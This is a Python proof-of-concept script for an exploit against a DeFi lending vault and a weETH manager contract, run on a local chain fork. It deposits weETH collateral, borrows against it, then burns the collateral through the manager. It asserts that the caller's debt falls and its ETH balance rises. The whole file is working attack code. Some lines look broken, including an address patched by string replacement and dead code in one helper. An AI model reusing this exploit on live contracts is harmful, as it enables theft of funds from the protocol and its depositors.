#!/usr/bin/env python3
# Reserve rebuilt-exit fork proof per attempt 964 recipe:
# reset 26394057 (C-1 of burn tx 0x0b37...), fund-token weETH 30e18 from holder
# 0x233c0920... to a fresh funded EOA (anvil account 0), EOA runs the Loop
# CDPVault borrow leg then the weETH-manager burn; assert the caller's debt
# drops by ~parity x N and the EOA ends with more ETH than it started.
import json, sys, urllib.request

URL = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:9003'
VAULT = '0x7d5706f6ef3f89b3951e23e557cdfbc3239d4e2c'      # CDPVault impl 0x41617d01
MANAGER = '0xfbfe6b9cee0e555bad7e2e7309effc75200cbe38'    # weETH manager (proxy)
WEETH = '0xcd5fe23c858207f7b72d0926fc9b05b43e359b7ee'.replace('07f7b', '820f7b')
EETH = '0x35fa164735182de50811e8e2e824cfb9b6118ac2'
EOA = '0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266'
POOL = '0x308861a4bb1a71e50490245f577068cc76f36145'
N = 30 * 10**18

SEL = {
    'approve': '0x095ea7b3',
    'deposit': '0x47e7ef24',      # deposit(address,uint256)
    'borrow': '0x5224372c',       # borrow(address borrower,address position,uint256 amount)
    'positions': '0x55f57510',    # positions(address)
    'token': '0xfc0c546a',
    'liquidationRatio': '0x1775765f',
    'spotPrice': '0x398482d8',
    'balanceOf': '0x70a08231',
    'vaultConfig': '0x7cc34bb4',
    'burn': '0xccc143b8',         # manager burn, 1 word (from recorded tx input)
}

_id = [0]
def rpc(m, p=None):
    body = {'jsonrpc': '2.0', 'id': _id[0], 'method': m, 'params': p or []}
    _id[0] += 1
    req = urllib.request.Request(URL, json.dumps(body).encode(),
                                 headers={'Content-Type': 'application/json'}, method='POST')
    return json.load(urllib.request.urlopen(req))

def hexw(x): return '0x%064x' % x
def wd(s): return s  # view return raw
def to_u(h): return int(h, 16) if h and h != '0x' else 0

def call(to, data):
    r = rpc('eth_call', [{'to': to, 'data': data}, 'latest'])
    if 'error' in r: raise RuntimeError(r['error'])
    return r['result']

def send(data):
    r = rpc('eth_sendTransaction', [{'from': EOA, 'to': VAULT if data.startswith(SEL['deposit']) else None, 'data': data}]) if False else rpc('eth_sendTransaction', [{'from': EOA, 'to': None, 'data': data}])
    return r

def sendto(to, data):
    tx = {'from': EOA, 'to': to, 'data': data,
          'gas': '0x' + format(500000, 'x')}
    r = rpc('eth_sendTransaction', [tx])
    if 'error' in r: return None, r['error']
    txh = r['result']
    for _ in range(30):
        rc = rpc('eth_getTransactionReceipt', [txh])
        if 'result' in rc and rc['result']:
            rec = rc['result']
            return txh, rec
    return txh, None

def main():
    gen0 = rpc('eth_blockNumber')['result']
    print('fork block at start', gen0)
    # sanity: vault collateral token is weETH
    t = to_u(call(VAULT, SEL['token']))
    print('vault.token()', hex(t)[:52], 'expect weETH', WEETH[:10])
    lr = to_u(call(VAULT, SEL['liquidationRatio']))
    sp = to_u(call(VAULT, SEL['spotPrice']))
    cfg = call(VAULT, SEL['vaultConfig'])
    print('liquidationRatio', lr, 'spotPrice(wad)', sp, 'vaultConfig', cfg[:138])
    pre_eth = int(rpc('eth_getBalance', [EOA, 'latest'])['result'], 16)
    pre_ses = to_u(call(WEETH, SEL['balanceOf'] + EOA[2:].lower().rjust(64, '0')))
    pos0 = call(VAULT, SEL['positions'] + EOA[2:].lower().rjust(64, '0'))
    print('pre EOA eth', pre_eth / 1e18, 'pre weETH', pre_ses / 1e18)
    print('positions(EOA) raw', pos0[:300])

    # 1) approve vault, deposit 30 weETH
    d = SEL['approve'] + VAULT[2:].lower().rjust(64, '0') + hexw(2**256 - 1)
    txh, rec = sendto(WEETH, d)
    print('approve->vault', txh, rec and rec['status'])
    d = SEL['deposit'] + EOA[2:].lower().rjust(64, '0') + hexw(N)
    txh_dep, rec = sendto(VAULT, d)
    print('deposit tx', txh_dep, 'status', rec['status'], 'gasUsed', rec['gasUsed'])
    pos = call(VAULT, SEL['positions'] + EOA[2:].lower().rjust(64, '0'))
    coll = to_u('0x' + pos[2 + 64:2 + 128]); debt0 = to_u('0x' + pos[2 + 128:2 + 192])
    print('after deposit: collateral', coll / 1e18, 'debt', debt0 / 1e18)

    # 2) borrow leg: measure the borrowable cap with stepped D
    borrowed = 0; D_used = 0
    for D in (32 * 10**18, 30 * 10**18, 28 * 10**18, 25 * 10**18, 22 * 10**18, 18 * 10**18, 12 * 10**18, 6 * 10**18):
        d = SEL['borrow'] + EOA[2:].lower().rjust(64, '0') + EOA[2:].lower().rjust(64, '0') + hexw(D)
        txh, rec = sendto(VAULT, d)
        ok = rec is not None and rec['status'] == '0x1'
        print('borrow D', D / 1e18, 'tx', txh, 'status', rec and rec['status'], 'gasUsed', rec and rec['gasUsed'])
        if ok:
            borrowed = D; D_used = D
            break
    if not borrowed:
        print('NO BORROW LEG SUCCEEDED - abort'); return
    pos = call(VAULT, SEL['positions'] + EOA[2:].lower().rjust(64, '0'))
    debt1 = to_u('0x' + pos[2 + 128:2 + 192])
    print('debt after borrow', debt1 / 1e18)

    # 3) burn leg: approve manager, burn N shares
    d = SEL['approve'] + MANAGER[2:].lower().rjust(64, '0') + hexw(2**256 - 1)
    txh, rec = sendto(WEETH, d)
    print('approve->manager', txh, rec and rec['status'])
    d = SEL['burn'] + hexw(N)
    txh_burn, rec = sendto(MANAGER, d)
    print('burn tx', txh_burn, 'status', rec['status'], 'gasUsed', rec['gasUsed'])

    # 4) post state
    post_eth = int(rpc('eth_getBalance', [EOA, 'latest'])['result'], 16)
    post_ses = to_u(call(WEETH, SEL['balanceOf'] + EOA[2:].lower().rjust(64, '0')))
    pos = call(VAULT, SEL['positions'] + EOA[2:].lower().rjust(64, '0'))
    coll2 = to_u('0x' + pos[2 + 64:2 + 128]); debt2 = to_u('0x' + pos[2 + 128:2 + 192])
    eeth_vault = to_u(call(EETH, SEL['balanceOf'] + VAULT[2:].lower().rjust(64, '0')))
    eeth_eoa = to_u(call(EETH, SEL['balanceOf'] + EOA[2:].lower().rjust(64, '0')))
    print('POST debt', debt2 / 1e18, 'collateral', coll2 / 1e18,
          'EOA eth delta', (post_eth - pre_eth) / 1e18, 'weETH left', post_ses / 1e18,
          'eETH@vault', eeth_vault / 1e18, 'eETH@EOA', eeth_eoa / 1e18)
    drop = debt1 - debt2
    print('debt drop', drop / 1e18, 'parity x N =', drop / 1e18 / (N / 1e18), 'ETH/weETH')
    print('ASSERT debt drop >= 0.9*parity*N? ', drop >= 0.9 * 1.1078 * 30 * 10**18)
    print('ASSERT EOA ends with more ETH than started?', post_eth > pre_eth)

    # 5) revert leg: borrow more with the collateral burned away -> must revert
    d = SEL['borrow'] + EOA[2:].lower().rjust(64, '0') + EOA[2:].lower().rjust(64, '0') + hexw(10 * 10**18)
    txh, rec = sendto(VAULT, d)
    print('revert-leg borrow 10 ETH tx', txh, 'status', rec and rec['status'], '(expect 0x0)')
    print('fork block at end', rpc('eth_blockNumber')['result'], 'start', gen0)
    print('TXH deposit', txh_dep); print('TXH borrow', 'see above'); print('TXH burn', txh_burn)

main()
